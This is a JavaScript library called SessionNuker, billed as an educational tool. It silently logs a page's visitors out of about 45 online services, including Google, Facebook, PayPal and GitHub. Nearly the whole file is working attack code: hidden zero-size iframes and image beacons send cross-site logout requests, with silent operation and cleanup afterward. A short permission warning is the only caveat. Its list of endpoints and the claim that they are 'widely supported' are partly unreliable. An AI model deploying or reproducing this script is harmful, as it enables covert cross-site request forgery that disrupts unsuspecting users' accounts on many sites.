/**
 * SessionNuker.js – Educational Cybersecurity Tool
 * ------------------------------------------------------------------
 * WARNING: This script attempts to log the current user out of many
 *          online services (Google, Facebook, Twitter, etc.).
 *          It's designed to demonstrate how easily session cookies
 *          can be invalidated via hidden requests.
 *
 *          USE ONLY ON YOUR OWN PAGES OR WITH EXPLICIT PERMISSION!
 *          Unauthorized use against other sites may violate laws.
 * ------------------------------------------------------------------
 * 
 * How to use:
 *   1. Include this script: <script src="sessionnuker.js"></script>
 *   2. Call the function: SessionNuker.logoutFromEverything()
 * 
 * Features:
 *   - Sends GET logout requests to 45+ platforms.
 *   - Uses hidden iframes + image beacons for maximum coverage.
 *   - Silent by default (no console spam unless debug mode enabled).
 *   - Returns a Promise that resolves when all requests are sent.
 */

;(function(global) {
    'use strict';

    // ------------------------------------------------------------------
    // LIST OF SERVICES + LOGOUT ENDPOINTS (GET-based, widely supported)
    // ------------------------------------------------------------------
    const LOGOUT_ENDPOINTS = [
        { name: "Google (all)", url: "https://accounts.google.com/Logout" },
        { name: "YouTube", url: "https://accounts.google.com/Logout" },
        { name: "Gmail", url: "https://mail.google.com/mail/?logout=true" },
        { name: "Facebook", url: "https://www.facebook.com/logout.php?confirm=1&buttonname=logout" },
        { name: "Twitter (X)", url: "https://twitter.com/logout" },
        { name: "Instagram", url: "https://www.instagram.com/accounts/logout/" },
        { name: "Microsoft / Live", url: "https://login.live.com/logout.srf" },
        { name: "Office 365", url: "https://login.microsoftonline.com/logout" },
        { name: "Amazon", url: "https://www.amazon.com/ap/signout" },
        { name: "LinkedIn", url: "https://www.linkedin.com/uas/logout" },
        { name: "Reddit", url: "https://www.reddit.com/logout" },
        { name: "GitHub", url: "https://github.com/logout" },
        { name: "Spotify", url: "https://accounts.spotify.com/en/logout" },
        { name: "Twitch", url: "https://www.twitch.tv/logout" },
        { name: "PayPal", url: "https://www.paypal.com/logout" },
        { name: "eBay", url: "https://signin.ebay.com/ws/eBayISAPI.dll?SignOut" },
        { name: "Yahoo", url: "https://login.yahoo.com/config/login?logout=1" },
        { name: "Netflix", url: "https://www.netflix.com/Logout" },
        { name: "Dropbox", url: "https://www.dropbox.com/logout" },
        { name: "Pinterest", url: "https://www.pinterest.com/logout/" },
        { name: "Apple iCloud", url: "https://www.icloud.com/logout" },
        { name: "Apple ID", url: "https://appleid.apple.com/signout" },
        { name: "Discord", url: "https://discord.com/logout" },
        { name: "Stack Overflow", url: "https://stackoverflow.com/users/logout" },
        { name: "Tumblr", url: "https://www.tumblr.com/logout" },
        { name: "Flickr", url: "https://www.flickr.com/signout" },
        { name: "Adobe", url: "https://account.adobe.com/logout" },
        { name: "Slack", url: "https://slack.com/logout" },
        { name: "Zoom", url: "https://zoom.us/logout" },
        { name: "Quora", url: "https://www.quora.com/logout" },
        { name: "Medium", url: "https://medium.com/logout" },
        { name: "WordPress.com", url: "https://wordpress.com/logout" },
        { name: "Atlassian", url: "https://id.atlassian.com/logout" },
        { name: "TikTok (web)", url: "https://www.tiktok.com/logout" },
        { name: "Snapchat (web)", url: "https://accounts.snapchat.com/accounts/logout" },
        { name: "HBO Max", url: "https://play.max.com/logout" },
        { name: "SoundCloud", url: "https://soundcloud.com/logout" },
        { name: "WhatsApp Web", url: "https://web.whatsapp.com/logout" },
        { name: "Epic Games", url: "https://www.epicgames.com/id/logout" },
        { name: "Steam Community", url: "https://steamcommunity.com/logout" },
        { name: "Twitch (alt)", url: "https://www.twitch.tv/logout" },
        { name: "Imgur", url: "https://imgur.com/signout" },
        { name: "DeviantArt", url: "https://www.deviantart.com/users/logout" },
        { name: "Canva", url: "https://www.canva.com/logout" }
    ];

    // ------------------------------------------------------------------
    // Internal helpers: hidden iframe & image beacon
    // ------------------------------------------------------------------
    let activeFrames = [];

    function cleanupFrame(iframe) {
        setTimeout(() => {
            if (iframe && iframe.parentNode) iframe.remove();
            const idx = activeFrames.indexOf(iframe);
            if (idx !== -1) activeFrames.splice(idx, 1);
        }, 2000);
    }

    function sendLogoutViaIframe(url, timeoutMs = 4000) {
        return new Promise((resolve) => {
            if (!url || typeof url !== 'string') {
                resolve(false);
                return;
            }
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.style.width = '0';
            iframe.style.height = '0';
            iframe.style.position = 'absolute';
            iframe.style.visibility = 'hidden';
            iframe.sandbox = 'allow-same-origin allow-scripts allow-forms allow-popups'; // needed to send cookies
            let resolved = false;

            const timeoutId = setTimeout(() => {
                if (!resolved) {
                    resolved = true;
                    cleanupFrame(iframe);
                    resolve(true); // request was likely sent anyway
                }
            }, timeoutMs);

            iframe.onload = () => {
                if (!resolved) {
                    resolved = true;
                    clearTimeout(timeoutId);
                    cleanupFrame(iframe);
                    resolve(true);
                }
            };
            iframe.onerror = () => {
                if (!resolved) {
                    resolved = true;
                    clearTimeout(timeoutId);
                    cleanupFrame(iframe);
                    resolve(false);
                }
            };

            try {
                iframe.src = url;
                document.body.appendChild(iframe);
                activeFrames.push(iframe);
            } catch (e) {
                clearTimeout(timeoutId);
                if (iframe.parentNode) iframe.remove();
                resolve(false);
            }
        });
    }

    // Image beacon as fallback for extra coverage
    function sendLogoutViaImage(url) {
        return new Promise((resolve) => {
            const img = new Image();
            img.style.display = 'none';
            let resolved = false;
            const tid = setTimeout(() => {
                if (!resolved) resolve(true);
                resolved = true;
            }, 2000);
            img.onload = img.onerror = () => {
                if (!resolved) {
                    clearTimeout(tid);
                    resolve(true);
                    resolved = true;
                }
                img.remove();
            };
            img.src = url;
        });
    }

    // ------------------------------------------------------------------
    // Public API
    // ------------------------------------------------------------------
    const SessionNuker = {
        /**
         * Logs the user out of all known services.
         * @param {Object} options - optional settings
         * @param {boolean} options.silent - if true, no console output (default: true)
         * @param {boolean} options.useBeacons - also send image beacons (default: true)
         * @returns {Promise<void>}
         */
        async logoutFromEverything(options = {}) {
            const { silent = true, useBeacons = true } = options;
            if (!silent) console.log("[SessionNuker] Starting mass logout...");

            const promises = [];
            for (const service of LOGOUT_ENDPOINTS) {
                // Primary iframe request
                promises.push(sendLogoutViaIframe(service.url));
                // secondary beacon for the same URL (extra randomness)
                if (useBeacons && Math.random() > 0.4) {
                    promises.push(sendLogoutViaImage(service.url));
                }
                // tiny delay to avoid overwhelming the browser
                await new Promise(r => setTimeout(r, 10));
            }

            await Promise.allSettled(promises);
            if (!silent) console.log("[SessionNuker] Logout requests sent to", LOGOUT_ENDPOINTS.length, "services.");
            
            // Clean leftover iframes after a short delay
            setTimeout(() => {
                activeFrames.forEach(f => { if (f && f.remove) f.remove(); });
                activeFrames = [];
            }, 5000);
        },

        /**
         * Immediately cleans up any remaining hidden iframes (call if needed).
         */
        cleanup() {
            activeFrames.forEach(f => { if (f && f.remove) f.remove(); });
            activeFrames = [];
        }
    };

    // Expose globally
    global.SessionNuker = SessionNuker;

    // Optional auto-execute: you can set a flag or just provide the function
    // For safety, nothing runs automatically. User must call SessionNuker.logoutFromEverything()
})(window);
